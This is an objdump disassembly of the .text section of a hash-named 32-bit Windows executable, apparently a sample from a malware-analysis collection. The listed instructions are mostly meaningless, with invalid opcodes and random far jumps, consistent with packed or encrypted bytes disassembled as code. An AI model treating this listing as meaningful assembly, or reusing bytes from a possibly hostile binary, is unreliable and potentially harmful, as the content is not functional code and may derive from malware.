
d6826db4efd4aadc49c1974b4a81db2eacb329e327fcaf210710b695e585553b.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    edi,DWORD PTR [edi+0x61]
  411003:	push   es
  411004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411005:	dec    esp
  411006:	cdq    
  411007:	push   0xbc1c793e
  41100c:	jmp    FWORD PTR [ebx+0x1a393f07]
  411012:	or     esi,DWORD PTR [eax]
  411014:	xor    cl,BYTE PTR [ebx+ebp*1]
  411017:	dec    ebp
  411018:	add    eax,0x7147dccc
  41101d:	lock iret 
  41101f:	mov    ecx,0x87dd7ed6
  411024:	push   DWORD PTR ds:0x21859547
  41102a:	jge    0x4110aa
  41102c:	fbstp  TBYTE PTR [ecx-0xd21e5b1]
  411032:	inc    edx
  411033:	or     esp,DWORD PTR [esi]
  411035:	jle    0x411080
  411037:	mov    ds:0xc300ad97,eax
  41103c:	inc    edi
  41103d:	das    
  41103e:	pop    ebp
  41103f:	outs   dx,DWORD PTR ds:[esi]
  411040:	xor    dl,BYTE PTR ds:0x66645512
  411046:	xor    DWORD PTR [eax],ebp
  411048:	xchg   ecx,eax
  411049:	jmp    DWORD PTR [edi-0xd956479]
  41104f:	mov    ?,WORD PTR [edx+ebp*4-0x75b42b91]
  411056:	push   0x6d
  411058:	(bad)  
  411059:	add    BYTE PTR ds:0x30b67dd8,0x5f
  411060:	out    0x22,al
  411062:	jecxz  0x41106c
  411064:	dec    ecx
  411065:	pop    eax
  411066:	add    eax,ebp
  411068:	push   ecx
  411069:	je     0x4110a6
  41106b:	cmp    DWORD PTR [ecx],ecx
  41106d:	mov    ebx,0xeb9f5add
  411072:	mov    ebp,0x21c80f02
  411077:	call   0x4dd5e4f9
  41107c:	and    edi,edx
  41107e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41107f:	xchg   DWORD PTR [eax-0x7b2ff805],esp
  411085:	adc    esp,DWORD PTR [edi-0x6e]
  411088:	push   0x3c
  41108a:	ja     0x411093
  41108c:	(bad)  
  41108d:	dec    edi
  41108e:	scas   al,BYTE PTR es:[edi]
  41108f:	push   ds
  411090:	or     DWORD PTR [ebp+0x62],eax
  411093:	or     bl,cl
  411095:	mov    DWORD PTR [edx],esp
  411097:	(bad)  
  411098:	sti    
  411099:	ret    
  41109a:	dec    edi
  41109b:	push   ecx
  41109c:	jge    0x411093
  41109e:	call   0x858dd544
  4110a3:	repz jmp 0x9c9fc790
  4110a9:	push   edi
  4110aa:	mov    eax,0xf7e205f
  4110af:	jmp    0x3afea362
  4110b4:	adc    eax,0xc55ff7cc
  4110b9:	jge    0x411138
  4110bb:	and    eax,0xffffffc6
  4110be:	mov    ds,WORD PTR [ebx]
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	jmp    0x23de:0x8fb6b931
  4110c8:	mov    bl,BYTE PTR es:[ebp+0x4821ddca]
  4110cf:	pop    edx
  4110d0:	adc    al,BYTE PTR [ebp+0x4d]
  4110d3:	add    al,0xe0
  4110d5:	cld    
  4110d6:	movaps XMMWORD PTR [esi+0x6fbc1114],xmm5
  4110dd:	inc    esp
  4110de:	(bad)
  4110e1:	and    BYTE PTR [ebp-0xa3c4060],dh
  4110e7:	mov    ch,0x32
  4110e9:	or     bl,bh
  4110eb:	in     al,0x77
  4110ed:	push   0xffffff82
  4110ef:	pop    ebp
  4110f0:	in     eax,0x61
  4110f2:	xor    al,dl
  4110f4:	mov    al,ds:0xa8db0978
  4110f9:	into   
  4110fa:	sbb    al,0xd4
  4110fc:	out    0xfe,eax
  4110fe:	pop    ds
  4110ff:	test   DWORD PTR [eax+0x46],0xa1511dc
  411106:	xlat   BYTE PTR ds:[ebx]
  411107:	in     eax,dx
  411108:	into   
  411109:	or     bl,BYTE PTR [ebp-0x31121d5a]
  41110f:	mov    ecx,0x7e72fa6
  411114:	dec    esi
  411115:	sub    eax,0xa77d162a
  41111a:	cmp    BYTE PTR [ebx+0x787a69c6],0xf7
  411121:	mov    eax,0xbf1ca9cf
  411126:	bound  edi,QWORD PTR [ecx]
  411128:	cmp    eax,0xc1b774c
  41112d:	jmp    0xfd87:0x79e95cb3
  411134:	pop    esi
  411135:	cld    
  411136:	shr    WORD PTR [edx+0x766885fe],0x70
  41113e:	mov    edi,0xdfe8e7be
  411143:	aam    0xd2
  411145:	adc    BYTE PTR [ebx+0x59],ah
  411148:	xor    BYTE PTR [esi+0x4e],ah
  41114b:	rcr    BYTE PTR [ebx+edx*8],1
  41114e:	sub    DWORD PTR [eax-0x6],0xcec5f50d
  411155:	xchg   ebx,eax
  411156:	ds push 0x7f0bf005
  41115c:	aad    0x4a
  41115e:	xor    ecx,DWORD PTR [esi+0x8]
  411161:	mov    ecx,0xd27cfade
  411166:	hlt    
  411167:	leave  
  411168:	clc    
  411169:	in     al,dx
  41116a:	pop    ss
  41116b:	enter  0x1de,0xf4
  41116f:	cwde   
  411170:	cmp    DWORD PTR [ebx+0x765d4b97],ebp
  411176:	bound  esi,QWORD PTR [ebp+esi*8+0x2f67a877]
  41117d:	mov    al,0x61
  41117f:	sbb    dl,bh
  411181:	retf   0x563f
  411184:	jbe    0x411200
  411186:	sub    DWORD PTR [edx*1-0x60558ae0],ecx
  41118d:	fild   WORD PTR [ecx+0x7efaf197]
  411193:	or     DWORD PTR [eax],ebx
  411195:	mov    ebp,0x962c6f99
  41119a:	pop    es
  41119b:	jg     0x411168
  41119d:	xor    cl,BYTE PTR [eax]
  41119f:	push   cs
  4111a0:	inc    ebp
  4111a1:	mov    edi,0x81ef5554
  4111a6:	xchg   esp,eax
  4111a7:	lea    eax,[ecx+0x29b3d0b9]
  4111ad:	or     al,0xef
  4111af:	dec    ebx
  4111b0:	xchg   ebp,eax
  4111b1:	fidivr WORD PTR [eax-0xd]
  4111b4:	lds    esp,FWORD PTR [eax]
  4111b6:	adc    BYTE PTR [eax-0x6c3667a1],ch
  4111bc:	arpl   dx,bp
  4111be:	lahf   
  4111bf:	xchg   edx,eax
  4111c0:	xchg   edi,eax
  4111c1:	mov    ds:0x1d4b851d,al
  4111c6:	mov    esp,0x8d2c8777
  4111cb:	loop   0x41117c
  4111cd:	adc    BYTE PTR [edx],dh
  4111cf:	or     DWORD PTR ds:0x2cf38cdc,eax
  4111d5:	inc    ebx
  4111d6:	bound  ebp,QWORD PTR [esi-0x6a8b5941]
  4111dc:	mov    dl,0xeb
  4111de:	loopne 0x411185
  4111e0:	cmp    bl,bl
  4111e2:	dec    ecx
  4111e3:	jmp    0x3e2165ca
  4111e8:	fst    QWORD PTR [esi+0x18c72e0a]
  4111ee:	jecxz  0x411185
  4111f0:	scas   al,BYTE PTR es:[edi]
  4111f1:	add    DWORD PTR [eax+ebp*1+0x47],esp
  4111f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111f6:	int    0xa3
  4111f8:	out    0x28,eax
  4111fa:	sbb    DWORD PTR [ebx+esi*2-0x3390e442],0x4219affc
  411205:	push   eax
  411206:	test   DWORD PTR [ecx],edi
  411208:	repz adc BYTE PTR [ebx+0x5e],ch
  41120c:	xchg   DWORD PTR [edx-0x5b],ebx
  41120f:	xor    eax,0xeb3b9892
  411214:	int3   
  411215:	aas    
  411216:	lods   al,BYTE PTR ds:[esi]
  411217:	int3   
  411218:	jmp    FWORD PTR [edx]
  41121a:	dec    ebx
  41121b:	mov    ch,0xc2
  41121d:	cli    
  41121e:	inc    esi
  41121f:	mov    al,0xa4
  411221:	out    dx,eax
  411222:	cmp    al,dl
  411224:	xchg   esp,eax
  411225:	push   es
  411226:	test   DWORD PTR ds:0xe5bdce05,0x83e467a6
  411230:	xchg   ecx,eax
  411231:	or     BYTE PTR [eax-0x44],ah
  411234:	sbb    BYTE PTR ds:0xdc518389,bl
  41123a:	sar    BYTE PTR [edi+0x40],1
  41123d:	retf   0x7a0c
  411240:	into   
  411241:	and    ebx,DWORD PTR [edi+0x50]
  411244:	cli    
  411245:	xor    al,0xa9
  411247:	mov    dl,0x23
  411249:	hlt    
  41124a:	xlat   BYTE PTR ds:[ebx]
  41124b:	scas   eax,DWORD PTR es:[edi]
  41124c:	iret   
  41124d:	mov    ah,0x84
  41124f:	ins    DWORD PTR es:[edi],dx
  411250:	ret    
  411251:	jno    0x4112b6
  411253:	sbb    BYTE PTR [eax-0x39],dl
  411256:	cld    
  411257:	out    0x45,eax
  411259:	outs   dx,BYTE PTR ds:[esi]
  41125a:	(bad)  
  41125b:	xor    edi,edx
  41125d:	push   0x7b
  41125f:	(bad)  
  411260:	stos   BYTE PTR es:[edi],al
  411261:	and    bl,BYTE PTR [ebp+0x64]
  411264:	pop    eax
  411265:	imul   edi,edi,0xffffffff
  411268:	fnstenv [ebx-0x64]
  41126b:	ds push es
  41126d:	sub    DWORD PTR [bx-0x2aaa],edi
  411272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411273:	push   ebx
  411274:	cli    
  411275:	sub    eax,0x65af232
  41127a:	xchg   esp,eax
  41127b:	sbb    BYTE PTR [esi-0x70],0x72
  41127f:	pop    edx
  411280:	fld    DWORD PTR [edx-0x6e826ca0]
  411286:	cs out dx,eax
  411288:	pop    ds
  411289:	hlt    
  41128a:	inc    eax
  41128b:	pop    edi
  41128c:	mov    ds:0x31c3be42,al
  411291:	enter  0xfae2,0xb3
  411295:	mov    ebp,0x37c51163
  41129a:	or     edx,ecx
  41129c:	lds    eax,FWORD PTR [esi+esi*1+0x6dd08945]
  4112a3:	(bad)  
  4112a4:	jmp    0x4061f1d2
  4112a9:	mov    edx,0xb1e02930
  4112ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112af:	repnz mov esi,0xd8041509
  4112b5:	pop    es
  4112b6:	arpl   bp,cx
  4112b8:	pop    edi
  4112b9:	out    dx,eax
  4112ba:	pop    ecx
  4112bb:	sub    ecx,DWORD PTR [ebx+0x55]
  4112be:	sub    dl,dl
  4112c0:	dec    ebx
  4112c1:	inc    ebp
  4112c2:	es mov edi,0x1123594f
  4112c8:	(bad)  
  4112c9:	aad    0x16
  4112cb:	sbb    eax,0xd589f80d
  4112d0:	aaa    
  4112d1:	mov    dl,0x9a
  4112d3:	ret    0xdf2c
  4112d6:	sub    DWORD PTR [esi],eax
  4112d8:	clc    
  4112d9:	cmp    eax,0x33eed575
  4112de:	mov    esi,0x4cde0ade
  4112e3:	arpl   WORD PTR [eax-0x149f92d1],dx
  4112e9:	xchg   edi,eax
  4112ea:	mov    ch,0x44
  4112ec:	cmp    cl,BYTE PTR [eax-0x2c]
  4112ef:	lods   eax,DWORD PTR ds:[esi]
  4112f0:	mov    ch,BYTE PTR [ebp+edi*1-0x2a]
  4112f4:	and    al,0x96
  4112f6:	leave  
  4112f7:	mov    ds:0xd4f519e8,eax
  4112fc:	push   ss
  4112fd:	enter  0x4566,0xb4
  411301:	mov    ebx,0x9d069ffb
  411306:	mov    ebp,0x62da487b
  41130b:	push   DWORD PTR [eax]
  41130d:	outs   dx,WORD PTR ds:[esi]
  41130f:	je     0x4112dc
  411311:	out    0x59,al
  411313:	test   al,0x74
  411315:	aas    
  411316:	lea    ebp,[eax]
  411318:	ret    
  411319:	fs or  al,0xc2
  41131c:	inc    eax
  41131d:	mov    dl,0x64
  41131f:	lock or ecx,esp
  411322:	push   ebp
  411323:	xor    BYTE PTR [esp+ecx*8-0x2cf230d7],ah
  41132a:	mov    edi,0x16f287df
  41132f:	popa   
  411330:	dec    eax
  411331:	xor    BYTE PTR [edx],0x88
  411334:	clc    
  411335:	stos   BYTE PTR es:[edi],al
  411336:	mov    esp,0x86b8e344
  41133b:	cs mov edi,0xb31468f2
  411341:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  411343:	jo     0x411374
  411345:	jbe    0x411384
  411347:	jmp    DWORD PTR [eax-0xa9d5be]
  41134d:	lds    esp,FWORD PTR [edi-0x39c75902]
  411353:	pop    ecx
  411354:	std    
  411355:	push   esp
  411356:	retf   0x6454
  411359:	in     eax,dx
  41135a:	std    
  41135b:	cmp    eax,0xaacec7e4
  411360:	in     eax,dx
  411361:	push   0x9bf8eff1
  411366:	test   al,0xc0
  411368:	xor    eax,0x79523daf
  41136d:	push   ebx
  41136e:	add    eax,0x23c4d4bd
  411373:	lea    ebx,[eax]
  411375:	jns    0x4113dc
  411377:	bound  edi,QWORD PTR [eax+0x5725d98a]
  41137d:	das    
  41137e:	jmp    0x8fff:0xb81855a5
  411385:	mov    ah,0x67
  411387:	into   
  411388:	xchg   ebp,eax
  411389:	call   FWORD PTR [eax-0x5e95ee2d]
  41138f:	sub    eax,0x69465c49
  411394:	dec    ecx
  411395:	mov    ebp,0xd185e05
  41139a:	push   ecx
  41139b:	jle    0x411347
  41139d:	inc    ebp
  41139e:	push   es
  41139f:	cdq    
  4113a0:	xor    dl,0xa2
  4113a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113a4:	nop
  4113a5:	lods   al,BYTE PTR ds:[esi]
  4113a6:	adc    DWORD PTR [edi-0x7a415f93],esp
  4113ac:	cmp    DWORD PTR [eax+edx*1-0x38998596],0xb5a17725
  4113b7:	mul    BYTE PTR [ecx+edx*1]
  4113ba:	xlat   BYTE PTR ds:[ebx]
  4113bb:	push   0xc086d331
  4113c0:	pushf  
  4113c1:	jmp    0x82955566
  4113c6:	ss (bad) 
  4113c8:	fidivr WORD PTR [eax-0x293cc7f2]
  4113ce:	or     DWORD PTR [edi-0x5cff95af],ecx
  4113d4:	mov    dl,0xd9
  4113d6:	stos   DWORD PTR es:[edi],eax
  4113d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113d8:	jmp    0x5339:0x4bf65b23
  4113df:	push   esi
  4113e0:	mov    ds:0x8191f6c,al
  4113e5:	dec    esp
  4113e6:	fsubr  DWORD PTR [eax+0x16]
  4113e9:	arpl   WORD PTR [ebp-0x60],dx
  4113ec:	dec    eax
  4113ed:	add    eax,0x12024855
  4113f2:	push   0x6
  4113f4:	inc    ebp
  4113f5:	retf   
  4113f6:	mov    dl,0x90
  4113f8:	rol    bl,cl
  4113fa:	pop    es
  4113fb:	dec    edi
  4113fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113fd:	sub    BYTE PTR gs:[ebx-0x66],al
  411401:	add    ecx,DWORD PTR [ecx]
  411403:	mov    ebx,0x503cd8f
  411408:	pop    es
  411409:	cmp    eax,DWORD PTR [edx-0x539682f]
  41140f:	test   BYTE PTR [esi],al
  411411:	jp     0x41139f
  411413:	(bad)  
  411414:	cwde   
  411415:	xchg   ebp,esi
  411417:	dec    BYTE PTR ds:0xbecbf796
  41141d:	inc    ebx
  41141e:	push   edi
  41141f:	imul   BYTE PTR [edx+edx*8+0x27]
  411423:	jns    0x411460
  411425:	and    ebp,DWORD PTR [eax+0x3b50d696]
  41142b:	lahf   
  41142c:	fdivrp st(3),st
  41142e:	adc    ebp,DWORD PTR [ebx+0x63]
  411431:	popf   
  411432:	cmp    eax,0x502ea3a
  411437:	add    ch,BYTE PTR [esi+0x2a4b06d5]
  41143d:	pop    eax
  41143e:	stos   DWORD PTR es:[edi],eax
  41143f:	fmul   DWORD PTR [esi]
  411441:	push   edx
  411442:	ret    
  411443:	inc    ebp
  411444:	popa   
  411445:	push   ebp
  411446:	mov    ecx,edx
  411448:	pop    ebx
  411449:	xor    al,BYTE PTR [ecx]
  41144b:	stos   DWORD PTR es:[edi],eax
  41144c:	sar    DWORD PTR [ecx+0x65],1
  41144f:	(bad)  
  411450:	dec    ecx
  411451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411452:	mov    esp,DWORD PTR [ebp-0x266c56e1]
  411458:	push   esi
  411459:	les    edi,FWORD PTR [ebx+0x3d]
  41145c:	and    al,BYTE PTR [edi-0x4dbea876]
  411462:	push   ss
  411463:	and    esp,DWORD PTR [edi+0x4e]
  411466:	sbb    DWORD PTR [ebx-0x5e937d8b],edx
  41146c:	stc    
  41146d:	rcr    al,1
  41146f:	mov    ds:0x5b0aa6a8,al
  411474:	shl    ebx,0xa4
  411477:	cmp    ebp,esi
  411479:	pop    es
  41147a:	std    
  41147b:	fwait
  41147c:	repnz or al,BYTE PTR [edx+eax*4-0x28]
  411481:	mov    esp,DWORD PTR [ecx-0x5a560454]
  411487:	jmp    0xf0b2:0xbb4f60c2
  41148e:	inc    edx
  41148f:	inc    ebx
  411490:	retf   0x7b31
  411493:	int3   
  411494:	jp     0x411432
  411496:	push   es
  411497:	je     0x411496
  411499:	mov    al,ds:0xad625600
  41149e:	mov    al,0x51
  4114a0:	fwait
  4114a1:	stos   BYTE PTR es:[edi],al
  4114a2:	mov    edi,0x5209ee4b
  4114a7:	(bad)  
  4114a8:	loop   0x4114ed
  4114aa:	dec    esp
  4114ab:	test   eax,0x1a4596f9
  4114b0:	and    DWORD PTR [eax],eax
  4114b2:	sub    DWORD PTR [ecx-0x26],0xc748017b
  4114b9:	mov    al,ds:0xb6f6b87
  4114be:	jns    0x4114eb
  4114c0:	xor    DWORD PTR [esp+ecx*1],ebp
  4114c3:	lea    edi,[esi+0x48822683]
  4114c9:	call   0xeebf:0xa2f5aa09
  4114d0:	repnz test eax,0x64827f3d
  4114d6:	and    DWORD PTR [eax],esi
  4114d8:	stc    
  4114d9:	mov    dh,0x2b
  4114db:	jne    0x411480
  4114dd:	rcl    edx,1
  4114df:	sub    BYTE PTR [edx],ah
  4114e1:	inc    edi
  4114e2:	test   DWORD PTR ds:0xcda9651c,eax
  4114e8:	pusha  
  4114e9:	and    dh,BYTE PTR [edi]
  4114eb:	push   0xffffffe6
  4114ed:	fisttp DWORD PTR [edi]
  4114ef:	stos   DWORD PTR es:[edi],eax
  4114f0:	mov    ebx,0x6f6962dc
  4114f5:	mov    esp,0x73e96962
  4114fa:	dec    ebp
  4114fb:	xchg   esi,eax
  4114fc:	fcmovb st,st(2)
  4114fe:	xor    edx,DWORD PTR [esi-0x58]
  411501:	inc    eax
  411502:	fsub   QWORD PTR [ebp+0x20c11108]
  411508:	lods   eax,DWORD PTR ds:[esi]
  411509:	push   ebp
  41150a:	dec    esi
  41150b:	imul   esi,DWORD PTR [edx],0xffffffbc
  41150e:	lock adc cl,al
  411511:	cs leave 
  411513:	mov    ch,0xa
  411515:	push   0xffffffc6
  411517:	mov    bh,0x8e
  411519:	cmp    ecx,DWORD PTR [edi]
  41151b:	jp     0x4114c7
  41151d:	push   0x8f91515f
  411522:	scas   eax,DWORD PTR es:[edi]
  411523:	adc    BYTE PTR [ebx],dh
  411525:	div    BYTE PTR ds:0xa069cd29
  41152b:	mov    al,ds:0xb8913cf4
  411530:	mov    edx,0x99c0fa
  411535:	inc    ebp
  411536:	xor    al,0xcb
  411538:	aas    
  411539:	out    0x61,eax
  41153b:	popf   
  41153c:	mov    cl,0x74
  41153e:	ja     0x411510
  411540:	ret    0x9e8f
  411543:	inc    esp
  411544:	add    eax,0x6b57cba6
  411549:	aad    0xb6
  41154b:	leave  
  41154c:	test   DWORD PTR [esi-0x70],edx
  41154f:	loopne 0x41157c
  411551:	sti    
  411552:	cdq    
  411553:	cs das 
  411555:	dec    esi
  411556:	xchg   ebx,eax
  411557:	mov    eax,ds:0xe0c8ff73
  41155c:	xchg   edx,eax
  41155d:	mov    edi,0x9fe072a4
  411562:	and    DWORD PTR [eax],0x1b5747da
  411568:	test   al,0x5
  41156a:	dec    esi
  41156b:	cdq    
  41156c:	(bad)  
  41156d:	mov    esp,0x77839999
  411572:	pop    edi
  411573:	cld    
  411574:	fbld   TBYTE PTR [eax+0x18]
  411577:	lahf   
  411578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411579:	rsm    
  41157b:	sbb    edx,ebx
  41157d:	and    dh,ah
  41157f:	(bad)  [eax+0x4d9a59af]
  411585:	loop   0x4115a6
  411587:	idiv   BYTE PTR [edx]
  411589:	test   al,0xdc
  41158b:	xor    al,0x46
  41158d:	loope  0x411591
  41158f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411590:	adc    ah,BYTE PTR [ecx+0x60]
  411593:	enter  0x66f,0x38
  411597:	cmp    bl,BYTE PTR [edx]
  411599:	repnz loopne 0x41152e
  41159c:	xor    ebx,eax
  41159e:	dec    edi
  41159f:	jl     0x411605
  4115a1:	popf   
  4115a2:	inc    edi
  4115a3:	push   ecx
  4115a4:	and    BYTE PTR [eax+0x1051fea1],0x39
  4115ab:	cmp    DWORD PTR ds:0x8677becb,edx
  4115b1:	nop
  4115b2:	jle    0x4115d6
  4115b4:	xchg   edx,eax
  4115b5:	fdivrp st(2),st
  4115b7:	dec    eax
  4115b8:	je     0x4115dc
  4115ba:	xchg   ecx,eax
  4115bb:	and    ah,BYTE PTR [ebx-0x36]
  4115be:	cmp    eax,0x71d0845a
  4115c3:	and    al,0x3f
  4115c5:	jno    0x4115dc
  4115c7:	sub    dl,BYTE PTR [edx+0x769c3e6a]
  4115cd:	ins    BYTE PTR es:[edi],dx
  4115ce:	add    bh,dl
  4115d0:	fild   WORD PTR [edi-0x77]
  4115d3:	sbb    dl,BYTE PTR ds:0xa1b38754
  4115d9:	in     al,0x6
  4115db:	mov    ebp,0xff4258e5
  4115e0:	adc    ah,ah
  4115e2:	cwde   
  4115e3:	dec    esi
  4115e4:	stos   DWORD PTR es:[edi],eax
  4115e5:	mov    ah,BYTE PTR [edx+eiz*8+0x73]
  4115e9:	idiv   DWORD PTR [edi-0x77]
  4115ec:	add    eax,0x94e61013
  4115f1:	adc    al,0x98
  4115f3:	lahf   
  4115f4:	ins    DWORD PTR es:[edi],dx
  4115f5:	hlt    
  4115f6:	stos   DWORD PTR es:[edi],eax
  4115f7:	call   0x7a6b:0xb2d46323
  4115fe:	js     0x4115dd
  411600:	jae    0x411623
  411602:	loop   0x41158e
  411604:	sti    
  411605:	test   BYTE PTR [esi],ah
  411607:	cld    
  411608:	mov    ah,0xe2
  41160a:	mov    ch,0x36
  41160c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41160d:	jno    0x4115d3
  41160f:	dec    ecx
  411610:	dec    edi
  411611:	cmp    dl,al
  411613:	in     al,dx
  411614:	inc    ebx
  411615:	inc    edi
  411616:	mov    dl,ch
  411618:	and    al,0x7
  41161a:	mov    ebp,0x1f475c1
  41161f:	mov    ecx,0xe6410504
  411624:	das    
  411625:	push   edi
  411626:	aam    0x2b
  411628:	aad    0x1e
  41162a:	(bad)  
  41162b:	cld    
  41162c:	push   ss
  41162d:	dec    eax
  41162e:	xlat   BYTE PTR ds:[ebx]
  41162f:	in     eax,dx
  411630:	pop    eax
  411631:	inc    esp
  411632:	pop    ds
  411633:	xchg   ebx,eax
  411634:	(bad)  
  411635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411636:	idiv   BYTE PTR [ebx]
  411638:	loope  0x41166c
  41163a:	int    0x44
  41163c:	jecxz  0x411655
  41163e:	and    eax,0x6960b76e
  411643:	idiv   BYTE PTR [ebx+0x75]
  411646:	inc    ecx
  411647:	int    0xe5
  411649:	jge    0x41161b
  41164b:	fldenv [edx]
  41164d:	test   eax,0x7b9cc11f
  411652:	jmp    0x1d47f4c3
  411657:	add    eax,0xb797212b
  41165c:	inc    edi
  41165d:	push   edx
  41165e:	sub    edx,DWORD PTR [edi-0x42]
  411661:	dec    esp
  411662:	mov    esi,0x379e0898
  411667:	jnp    0x4115fe
  411669:	out    dx,eax
  41166a:	mov    gs,WORD PTR [esi]
  41166c:	ror    BYTE PTR [edi-0x309682b4],cl
  411672:	xor    ebp,edi
  411674:	mov    al,ds:0x35fe9a30
  411679:	test   DWORD PTR [edi],edx
  41167b:	out    dx,eax
  41167c:	push   esi
  41167d:	pop    eax
  41167e:	(bad)  
  41167f:	call   0x5fb9f910
  411684:	push   ebp
  411685:	dec    esp
  411686:	shr    DWORD PTR [ecx+ecx*2-0x4a],cl
  41168a:	mov    esp,0x7bd22138
  41168f:	jmp    0xfd07:0x679be109
  411696:	enter  0x29f,0x4a
  41169a:	xchg   esp,eax
  41169b:	test   DWORD PTR [ecx-0x47],edx
  41169e:	mov    bh,0xca
  4116a0:	mov    bh,0x16
  4116a2:	jmp    0xff8f:0xec017e12
  4116a9:	dec    dh
  4116ab:	jecxz  0x4116d4
  4116ad:	push   edx
  4116ae:	shr    DWORD PTR [eax+0x28],cl
  4116b1:	data16 jae 0x411679
  4116b4:	adc    cl,dl
  4116b6:	cmp    BYTE PTR [edi+0x202a0bcd],bh
  4116bc:	add    al,0x3e
  4116be:	bnd jae 0x411706
  4116c1:	(bad)  
  4116c2:	xchg   ecx,eax
  4116c3:	(bad)  
  4116c5:	or     al,0xfb
  4116c7:	out    0xc5,al
  4116c9:	mov    ecx,0x57383e30
  4116ce:	jo     0x4116b2
  4116d0:	inc    ecx
  4116d1:	cmp    eax,ebx
  4116d3:	mov    ah,0xc5
  4116d5:	jb     0x411727
  4116d7:	adc    DWORD PTR ds:0xd302f64d,ebp
  4116dd:	and    al,0x6a
  4116df:	pop    edi
  4116e0:	int    0x35
  4116e2:	inc    esp
  4116e3:	xchg   ecx,eax
  4116e4:	lock cdq 
  4116e6:	push   edx
  4116e7:	out    0xd2,al
  4116e9:	xchg   ebp,eax
  4116ea:	xor    al,0x8f
  4116ec:	mov    esp,0x5596f495
  4116f1:	loope  0x4116ac
  4116f3:	and    al,0x94
  4116f5:	sahf   
  4116f6:	mov    bh,0x3c
  4116f8:	(bad)  
  4116f9:	and    eax,ebx
  4116fb:	xor    ah,cl
  4116fd:	(bad)  
  4116fe:	(bad)  
  4116ff:	sbb    esi,DWORD PTR [ecx]
  411701:	loop   0x41171d
  411703:	and    eax,DWORD PTR [eax+0x78ac67f]
  411709:	inc    ecx
  41170a:	pusha  
  41170b:	cdq    
  41170c:	mov    bh,0x4f
  41170e:	and    DWORD PTR [ecx-0x2f050be8],0x13
  411715:	test   BYTE PTR [eax-0x7a7d1845],cl
  41171b:	push   ss
  41171c:	push   ebx
  41171d:	repnz les edx,FWORD PTR ds:0xb45c68f4
  411724:	retf   0xcb4e
  411727:	(bad)  
  411728:	jnp    0x411798
  41172a:	mov    cl,0x7b
  41172c:	jecxz  0x4116c7
  41172e:	lea    ecx,[edx-0x67]
  411731:	add    dl,BYTE PTR ds:0x59426945
  411737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411738:	das    
  411739:	mov    cl,0x3e
  41173b:	in     eax,0xbe
  41173d:	add    DWORD PTR [edi+0x5e748e5a],ebx
  411743:	or     dl,BYTE PTR [esi+ebp*8]
  411746:	leave  
  411747:	push   0xf3585f0f
  41174c:	mov    ecx,0xddaedd2c
  411751:	stos   DWORD PTR es:[edi],eax
  411752:	push   edx
  411753:	jmp    0x411756
  411755:	mov    bl,0x80
  411757:	fcmovnbe st,st(6)
  411759:	aaa    
  41175a:	ins    BYTE PTR es:[edi],dx
  41175b:	mov    eax,ds:0x66ed33e9
  411760:	ror    BYTE PTR [esi],1
  411762:	lea    ecx,ds:0xbbe7233e
  411768:	push   eax
  411769:	jl     0x41171c
  41176b:	jns    0x4117bc
  41176d:	push   esp
  41176e:	mov    bh,0xda
  411770:	push   edx
  411771:	push   ds
  411772:	test   ebp,edx
  411774:	xchg   ebp,eax
  411775:	and    bl,BYTE PTR [eax]
  411777:	retf   
  411778:	(bad)  [eax+eax*4-0x1a3e9dcc]
  41177f:	retf   
  411780:	es pop ds
  411782:	neg    DWORD PTR [eax-0x1c27029e]
  411788:	push   edx
  411789:	xchg   ecx,eax
  41178a:	ins    BYTE PTR es:[edi],dx
  41178b:	dec    esp
  41178c:	jae    0x411726
  41178e:	jl     0x411775
  411790:	(bad)
  411794:	je     0x4117fc
  411796:	iret   
  411797:	mov    ds:0x29224a3e,al
  41179c:	dec    esp
  41179d:	inc    ebx
  41179e:	out    0x22,al
  4117a0:	lods   eax,DWORD PTR es:[esi]
  4117a2:	jle    0x411727
  4117a4:	jg     0x4117bf
  4117a6:	inc    edx
  4117a7:	jnp    0x4117b2
  4117a9:	and    BYTE PTR [edx-0xb],ah
  4117ac:	mov    ds:0x82854143,eax
  4117b1:	mov    edx,0x5676a724
  4117b6:	jle    0x41179e
  4117b8:	xchg   edx,eax
  4117b9:	leave  
  4117ba:	and    edi,edi
  4117bc:	test   eax,0x93a075a1
  4117c1:	ja     0x411791
  4117c3:	loop   0x411753
  4117c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117c6:	ds jge 0x41178e
  4117c9:	pop    ebx
  4117ca:	and    DWORD PTR [esp+eiz*8+0x7499783c],ebx
  4117d1:	mov    edx,DWORD PTR [eax+ebp*2+0x21033a46]
  4117d8:	xchg   edx,eax
  4117d9:	xchg   esp,eax
  4117da:	sahf   
  4117db:	cli    
  4117dc:	(bad)  [eax+0x5b]
  4117df:	aad    0xda
  4117e1:	jecxz  0x41177e
  4117e3:	add    eax,ebx
  4117e5:	test   DWORD PTR [eax-0x20a88635],ebp
  4117eb:	(bad)  
  4117ec:	int3   
  4117ed:	rol    BYTE PTR [ecx-0x4974d356],1
  4117f3:	inc    ebx
  4117f4:	sub    ah,dh
  4117f6:	shl    BYTE PTR [edi+0x5a],0xbd
  4117fa:	dec    ebx
  4117fb:	pop    esp
  4117fc:	xor    dl,BYTE PTR [ecx+0x3d]
  4117ff:	inc    ecx
  411800:	imul   ecx,DWORD PTR [edx-0x48],0x30c937a0
  411807:	dec    edx
  411808:	in     eax,dx
  411809:	ret    0x8cf4
  41180c:	mul    BYTE PTR [ebx-0x715966df]
  411812:	pop    ss
  411813:	lds    ecx,FWORD PTR [ecx+0x5a022233]
  411819:	xor    al,0x2c
